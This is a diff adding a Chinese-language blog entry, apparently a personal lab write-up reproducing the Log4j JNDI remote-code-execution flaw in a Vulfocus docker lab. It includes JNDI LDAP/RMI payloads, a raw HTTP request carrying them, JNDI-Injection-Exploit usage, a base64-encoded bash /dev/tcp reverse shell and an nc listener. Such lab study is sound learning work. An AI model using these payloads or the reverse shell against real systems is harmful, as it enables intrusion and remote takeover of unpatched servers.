@@ -2609,4 +2609,70 @@
         <tag>PWN学习</tag>
       </tags>
   </entry>
+  <entry>
+    <title>log4j远程RCE漏洞复现笔记</title>
+    <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="log4j远程rce复现笔记"><a class="markdownIt-Anchor" href="#log4j远程rce复现笔记"></a> log4j远程rce复现笔记</h1>
+<h2 id="0x00-vulfocus搭建"><a class="markdownIt-Anchor" href="#0x00-vulfocus搭建"></a> 0x00  Vulfocus搭建</h2>
+<p>其实直接在docker拉取镜像即可，不过我觉得这个漏洞集成环境还是挺不错的，就顺手试试，环境Ubuntu20.10，参考官方文档<a href="https://github.com/fofapro/vulfocus/blob/master/INSTALL.md">vulfocus/INSTALL.md at master · fofapro/vulfocus (github.com)</a></p>
+<p>1.先安装docker,使用国内daocloud 一键安装命令</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">curl -sSL http<span class="hljs-variable">s:</span>//<span class="hljs-built_in">get</span>.daocloud.io/docker | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure>
+<p>2.拉取 Vulfocus 镜像：</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull vulfocus/vulfocus:latest<br></code></pre></td></tr></table></figure>
+<p>3.运行 Vulfocus，email那几个参数应该是可以不要的</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">sudo docker <span class="hljs-builtin-name">run</span> -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e <span class="hljs-attribute">VUL_IP</span>=192.168.111.130 -e <span class="hljs-attribute">EMAIL_HOST</span>=<span class="hljs-string">&quot;192.168.111.130 &quot;</span> -e <span class="hljs-attribute">EMAIL_HOST_USER</span>=<span class="hljs-string">&quot;admin@admin.com&quot;</span> -e <span class="hljs-attribute">EMAIL_HOST_PASSWORD</span>=<span class="hljs-string">&quot;12345678&quot;</span> vulfocus/vulfocus<br></code></pre></td></tr></table></figure>
+<p>4.拉取漏洞镜像，镜像管理直接添加就行，可以通过名字添加，Vulfocus 的 docker 仓库 <a href="https://hub.docker.com/u/vulfocus">https://hub.docker.com/u/vulfocus</a></p>
+<img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213153359282.png" alt="image-20211213153359282" style="zoom:80%;">
+<p>这里输入镜像名称vulfocus/log4j2-rce-2021-12-09即可添加log4j漏洞镜像</p>
+<img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213153601659.png" alt="image-20211213153601659" style="zoom: 80%;">
+<p>之后启动靶场即可。</p>
+<h2 id="0x01-漏洞验证"><a class="markdownIt-Anchor" href="#0x01-漏洞验证"></a> 0x01 漏洞验证</h2>
+<p>这里使用知道创宇的平台进行验证，根据网上通用poc</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/xxxxxx/</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>该靶场payload为：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/hello</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:55000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded <br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>41<br><br>payload=$&#123;jndi:ldap://xxxxxx/exp&#125;<br></code></pre></td></tr></table></figure>
+<p>验证：</p>
+<p><strong>1.bp发送请求包</strong></p>
+<img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213154147764.png" alt="image-20211213154147764" style="zoom:80%;">
+<p><strong>2.平台收到请求</strong></p>
+<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213154256762.png" alt="image-20211213154256762"></p>
+<h2 id="0x02-远程rce验证"><a class="markdownIt-Anchor" href="#0x02-远程rce验证"></a> 0x02 远程RCE验证</h2>
+<p>需要使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n/JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p>
+<p><strong>使用方法</strong></p>
+<p>可执行程序为jar包，在命令行中运行以下命令：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">$ java -jar JNDI-Injection-Exploit-<span class="hljs-number">1.0</span>-SNAPSHOT-all<span class="hljs-selector-class">.jar</span> <span class="hljs-selector-attr">[-C]</span> <span class="hljs-selector-attr">[command]</span> <span class="hljs-selector-attr">[-A]</span> <span class="hljs-selector-attr">[address]</span><br></code></pre></td></tr></table></figure>
+<p>其中:</p>
+<ul>
+<li>
+<p><strong>-C</strong> - 远程class文件中要执行的命令。</p>
+<p>（可选项 , 默认命令是mac下打开计算器，即&quot;open /Applications/Calculator.app&quot;）</p>
+</li>
+<li>
+<p><strong>-A</strong> - 服务器地址，可以是IP地址或者域名。</p>
+<p>（可选项 , 默认地址是第一个网卡地址）</p>
+</li>
+</ul>
+<p><strong>这个靶场据说只能使用rmi协议，为了防止错误需要对命令进行base64编码，反弹shell命令如下</strong></p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/ip/端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-attribute">base64</span>编码=&gt;YmFzaCAtaSA+JiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">9</span>pcC/v<span class="hljs-number">4</span>yAwPiYx<br></code></pre></td></tr></table></figure>
+<p>vps上使用启动命令：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC/v4yAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A 你的ip<br></code></pre></td></tr></table></figure>
+<p>效果如下</p>
+<img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213164907314.png" alt="image-20211213164907314" style="zoom:80%;">
+<p>注意的是这个靶场只能使用Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):下的payload，所以payload为</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">rmi:</span>/<span class="hljs-regexp">/xxx.xxx.xxx.xxx/xxxx</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>bp发送请求包即可反弹shell</p>
+<img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213165136457.png" alt="image-20211213165136457" style="zoom:80%;">
+<p>vps开启nc监听即可</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nc -lvp 端口<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8BRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/image-20211213165205181.png" alt="image-20211213165205181"></p>
+<p><strong>后续试试Windows环境反弹shell</strong></p>
+]]></content>
+      <categories>
+        <category>web学习</category>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>web学习</tag>
+      </tags>
+  </entry>
 </search>
